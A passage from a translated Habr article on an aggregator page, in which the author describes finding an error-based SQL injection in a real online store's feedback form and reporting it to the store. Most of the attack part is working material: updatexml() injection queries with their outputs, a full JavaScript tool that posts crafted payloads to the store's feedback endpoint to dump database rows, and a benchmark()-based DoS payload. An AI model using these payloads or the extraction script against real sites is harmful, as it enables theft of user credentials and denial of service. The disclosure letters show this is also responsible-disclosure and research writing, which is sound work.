class="hljs-keyword">into</span></span> t <span class="hljs-keyword"><span class="hljs-keyword">values</span></span> (<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> updatexml(<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">concat</span></span>(<span class="hljs-string"><span class="hljs-string">'~'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">version</span></span>()), <span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-string"><span class="hljs-string">''</span></span>); ERROR 1105 (HY000): XPATH syntax error: '~5.6.25-0ubuntu0.15.04.1' mysql&gt; <span class="hljs-keyword"><span class="hljs-keyword">insert</span></span> <span class="hljs-keyword"><span class="hljs-keyword">into</span></span> t <span class="hljs-keyword"><span class="hljs-keyword">values</span></span> (<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> updatexml(<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">concat</span></span>(<span class="hljs-string"><span class="hljs-string">'~'</span></span>, <span class="hljs-string"><span class="hljs-string">'1234567890123456789012345678901234567890'</span></span>), <span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-string"><span class="hljs-string">''</span></span>); ERROR 1105 (HY000): XPATH syntax error: '~1234567890123456789012345678901'</code> </pre><br>  The same limit is 32 characters. <br><br>  Let's try the output to the file: <br><pre> <code class="sql hljs">mysql&gt; <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> dual <span class="hljs-keyword"><span class="hljs-keyword">into</span></span> <span class="hljs-keyword"><span class="hljs-keyword">outfile</span></span> <span class="hljs-string"><span class="hljs-string">'test.txt'</span></span>; Query OK, 1 row affected (0,00 sec) $ sudo ls -la /var/lib/mysql/test/  124 drwx<span class="hljs-comment"><span class="hljs-comment">------ 2 mysql mysql 4096 . 11 18:07 . drwx------ 12 mysql mysql 4096 . 11 17:50 .. -rw-rw---- 1 mysql mysql 65 . 11 17:50 db.opt -rw-rw-rw- 1 mysql mysql 2 . 11 18:07 test.txt -rw-rw---- 1 mysql mysql 8584 . 11 17:52 t.frm -rw-rw---- 1 mysql mysql 98304 . 11 17:52 t.ibd mysql&gt; insert into t values (1, '' or updatexml(1, concat('~', (select 1 from dual into outfile 'test.txt')), 0) or ''); ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'into outfile 'test.txt')), 0) or '')' at line 1</span></span></code> </pre><br>  Expected, but it was worth checking out.  Let's try reading the file.  So it looks like this: <br><pre> <code class="sql hljs">mysql&gt; <span class="hljs-keyword"><span class="hljs-keyword">LOAD</span></span> <span class="hljs-keyword"><span class="hljs-keyword">DATA</span></span> <span class="hljs-keyword"><span class="hljs-keyword">INFILE</span></span> <span class="hljs-string"><span class="hljs-string">'test.txt'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">into</span></span> <span class="hljs-keyword"><span class="hljs-keyword">table</span></span> t; Query OK, 1 row affected, 1 warning (0,08 sec) Records: 1 Deleted: 0 Skipped: 0 Warnings: 1 mysql&gt; <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> t; +<span class="hljs-comment"><span class="hljs-comment">------+------+ | id | msg | +------+------+ | 1 | msg | | 1 | NULL | +------+------+ 2 rows in set (0,00 sec)</span></span></code> </pre><br>  But inside INSERT INTO also does not work: <br><pre> <code class="sql hljs">mysql&gt; <span class="hljs-keyword"><span class="hljs-keyword">insert</span></span> <span class="hljs-keyword"><span class="hljs-keyword">into</span></span> t <span class="hljs-keyword"><span class="hljs-keyword">values</span></span> (<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> updatexml(<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">concat</span></span>(<span class="hljs-string"><span class="hljs-string">'~'</span></span>, (<span class="hljs-keyword"><span class="hljs-keyword">LOAD</span></span> <span class="hljs-keyword"><span class="hljs-keyword">DATA</span></span> <span class="hljs-keyword"><span class="hljs-keyword">INFILE</span></span> <span class="hljs-string"><span class="hljs-string">'test.txt'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">into</span></span> <span class="hljs-keyword"><span class="hljs-keyword">table</span></span> t)), <span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-string"><span class="hljs-string">''</span></span>); ERROR 1064 (42000): You have an error in your SQL syntax; <span class="hljs-keyword"><span class="hljs-keyword">check</span></span> the <span class="hljs-keyword"><span class="hljs-keyword">manual</span></span> that corresponds <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> your MySQL <span class="hljs-keyword"><span class="hljs-keyword">server</span></span> <span class="hljs-keyword"><span class="hljs-keyword">version</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> the <span class="hljs-keyword"><span class="hljs-keyword">right</span></span> syntax <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> <span class="hljs-keyword"><span class="hljs-keyword">use</span></span> near <span class="hljs-string"><span class="hljs-string">'LOAD DATA INFILE '</span></span>test.txt<span class="hljs-string"><span class="hljs-string">' into table t)), 0) or '')'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">at</span></span> line <span class="hljs-number"><span class="hljs-number">1</span></span> mysql&gt; <span class="hljs-keyword"><span class="hljs-keyword">insert</span></span> <span class="hljs-keyword"><span class="hljs-keyword">into</span></span> t <span class="hljs-keyword"><span class="hljs-keyword">values</span></span> (<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> updatexml(<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">concat</span></span>(<span class="hljs-string"><span class="hljs-string">'~'</span></span>, (<span class="hljs-keyword"><span class="hljs-keyword">LOAD</span></span> <span class="hljs-keyword"><span class="hljs-keyword">DATA</span></span> <span class="hljs-keyword"><span class="hljs-keyword">INFILE</span></span> <span class="hljs-string"><span class="hljs-string">'test.txt'</span></span>)), <span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-string"><span class="hljs-string">''</span></span>); ERROR 1064 (42000): You have an error in your SQL syntax; <span class="hljs-keyword"><span class="hljs-keyword">check</span></span> the <span class="hljs-keyword"><span class="hljs-keyword">manual</span></span> that corresponds <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> your MySQL <span class="hljs-keyword"><span class="hljs-keyword">server</span></span> <span class="hljs-keyword"><span class="hljs-keyword">version</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> the <span class="hljs-keyword"><span class="hljs-keyword">right</span></span> syntax <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> <span class="hljs-keyword"><span class="hljs-keyword">use</span></span> near <span class="hljs-string"><span class="hljs-string">'LOAD DATA INFILE '</span></span>test.txt<span class="hljs-string"><span class="hljs-string">')), 0) or '')'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">at</span></span> line <span class="hljs-number"><span class="hljs-number">1</span></span></code> </pre><br>  In any case, in relation to the online store, full paths to the site are unknown to me, for example, to create a PHP Shell. <br></div></div><br><br>  <b>Posted in online store</b> <div class="spoiler">  <b class="spoiler_title">Letter</b> <div class="spoiler_text">  Hello. <br><br>  Accidentally discovered an error on your site. <br>  Page <a href="http://a.b.ru/">ABru</a> &lt;path&gt;, feedback form. <br>  If you fill in the name and e-mail, and use the single quote character (') in the message body, then after clicking on ‚ÄúSend‚Äù, an error from the used DBMS will appear on the screen for a while.  If you read and correct the message text, you can get any information stored in the database. <br><br>  I propose to correct the error as soon as possible, check all modules / pages written by the programmer for similar problems and close this source of problems. <br></div></div>  Received <div class="spoiler">  <b class="spoiler_title">answer</b> <div class="spoiler_text">  Good afternoon, Maxim. <br><br>  Thank you for your comment. <br><br>  Respectfully, <br>  AB <br></div></div>  Thinking, sent <div class="spoiler">  <b class="spoiler_title">one more letter</b> <div class="spoiler_text">  If you do not mind, I would describe my ‚Äúsports interest‚Äù in the article without direct and indirect links to the site and the company, of course.  Please let us know when the problem is fixed, just in case. <br></div></div><br><br>  <b>Next day</b> <br><br>  There is no response to the second letter.  Well, okay.  Exactly a day later I went to the same page with a feedback form.  Now in the input field all specials are filtered.  characters, of course, on the client side.  Well, well done, it remains to hope that this is just a patch at the time of correcting real errors.  In the meantime, I decided to continue research - I want to understand to the end. <br><br>  As it turned out, the useful part of the error text in the response from MariaDB is not always 32 characters.  When you try to get the text in Russian, you can only get 16 characters.  Checked on MySQL - the same.  This means that the limit is not 32 characters, but 32 bytes.  Well, I redid the <a href="https://gist.github.com/maxvyaznikov/96f36c837c67f2fad00d">ajax93t411</a> utility: <br><div class="spoiler">  <b class="spoiler_title">ajax93t411.js</b> <div class="spoiler_text"><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ANS_START = <span class="hljs-string"><span class="hljs-string">" '~"</span></span>, ANS_STOP = <span class="hljs-string"><span class="hljs-string">"' SQL="</span></span>, ANS_LIM = <span class="hljs-number"><span class="hljs-number">31</span></span>; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ajax93t411</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">start_from, lim, construct_req</span></span></span><span class="hljs-function">) </span></span>{ start_from = start_from || <span class="hljs-number"><span class="hljs-number">0</span></span>; lim = lim || <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-comment"><span class="hljs-comment">// Can be -1. -1 if for "while no Err" function req(i, offset, callback) { $.ajax({ //-- All this params is for customization. Feel free url: '/feedback/post.php', method: 'POST', data: $.param({ data_email: 'undefined', data_email_body: 'undefined', data_email_subject: 'A B', type: 'feedback', name: 'Test', mail: 'test@mailinator.com', phone: '', feedbacktext: construct_req(start_from, i, offset), // Don't forget about this function to include else: '', recipient: 'A@B.ru', btn: '' } //--- ), success: function(resp) { var answer = resp.substring(resp.indexOf(ANS_START) + ANS_START.length, resp.indexOf(ANS_STOP)); if (answer == ANS_ERR) { callback(answer); } else { callback(null, answer); } }, error: function(jqXHR, textStatus) { callback(textStatus); } }); } function constructReq(i, full_answer, offset, next) { req(i, offset, function(err, answer) { if (err) return next(err, full_answer); full_answer += answer; if (answer.length &gt; 0) { constructReq(i, full_answer, offset + answer.length, next); } else { $('body').append('&lt;p&gt;'+ full_answer +'&lt;/p&gt;'); // Include each new result into webpage of target site. Just for usability. next(null, full_answer); } }); } function timesSeries(lim, i, results, callback) { if (i &lt; lim) { constructReq(i, '', 1, function(err, answer) { if (err) return callback(err, results); results.push(answer); timesSeries(lim, i + 1, results, callback); }); } else { callback(null, results); } } function untilErrSeries(i, results, callback) { constructReq(i, '', 1, function(err, answer) { if (err) return callback(err, results); results.push(answer); untilErrSeries(i + 1, results, callback); }); } function complete(err, results) { if (err) console.error(err); window.INJ_RESULTS = results; // Keep all results into the global variable. Just for usability. console.log('Done'); } $('body').append('&lt;p&gt;&lt;b&gt;New Request!&lt;/b&gt;&lt;/p&gt;'); if (lim &gt; 0) { timesSeries(lim, 0, [], complete); } else { // lim &lt; 0 untilErrSeries(0, [], complete); } }</span></span></code> </pre><br></div></div><br>  Now the program does not depend on the constant length, but continues to search for the end of the line until an error is returned (that is, the answer with the error text is not in the format in which the program expects it).  Yes, a little more requests.  But there is no problem with the texts in non-latin encodings.  In addition, I got rid of the dependence on the async library (it was present for the speed of developing and testing the results).  It also added the ability to not specify a specific number of rows in the table to be obtained, but to recursively receive all available (before the error).  And also added the output of the work directly to the page of the site to make it easier to view. <br><br>  <b>Are the terrible consequences of such a vulnerability?</b> <br><br>  As we have already found out, it is impossible to write something to the file or read from it, even if the user has rights to do so.  But we have in the pocket of the table with passwords and email.  addresses of all users and administrators.  Personally, I did not even try to select them and enter the site - I do not need it.  Nevertheless, it can be stated that it is possible to read any information from the current database, and in our case from the neighboring one. <br>  Another possibility that can be discovered by a similar vulnerability is a DoS attack, for example, with this substitution: <br><pre> <code class="sql hljs">' or updatexml(0, concat(0x7e,(<span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">benchmark</span></span>(<span class="hljs-number"><span class="hljs-number">10000000000000000000000000000000000000000000000</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">encode</span></span>(<span class="hljs-string"><span class="hljs-string">'hello'</span></span>, <span class="hljs-string"><span class="hljs-string">'world'</span></span>)))), <span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-string"><span class="hljs-string">'</span></span></code> </pre><br><br>  <b>A week later</b> <br><br>  I decided to write <br><div class="spoiler">  <b class="spoiler_title">one more letter</b> <div class="spoiler_text">  Good day. <br><br>  You understand that the current patch does not eliminate vulnerabilities? <br></div></div><br>  There was no answer as before. <br><br>  PS: Article published 13 days after the discovery of the vulnerability.  Representatives of the online store do not contact us. </div><p>Source: <a href="https://habr.com/ru/post/264579/">https://habr.com/ru/post/264579/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../264569/index.html">BEMIT: The next step in the development of BEM according to Harry Roberts</a></li>
<li><a href="../264571/index.html">Incremental update backup as DBMS backup strategy</a></li>
<li><a href="../264573/index.html">How not to build networks</a></li>
<li><a href="../264575/index.html">I have no idea what the hell I'm doing</a></li>
<li><a href="../264577/index.html">Game Development with Unity and Intel RealSense 3D Cameras</a></li>
<li><a href="../264581/index.html">Untouchable oracle</a></li>
<li><a href="../264583/index.html">Lightweight module for HTTP requests</a></li>
<li><a href="../264585/index.html">Keep it simple, and people will reach out to you, or how to fall in love with C, keeping your sanity</a></li>
<li><a href="../264587/index.html">MCMC and Bayesian statistics in BASIC</a></li>
<li><a href="../264589/index.html">Live Chat & ActionCable</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>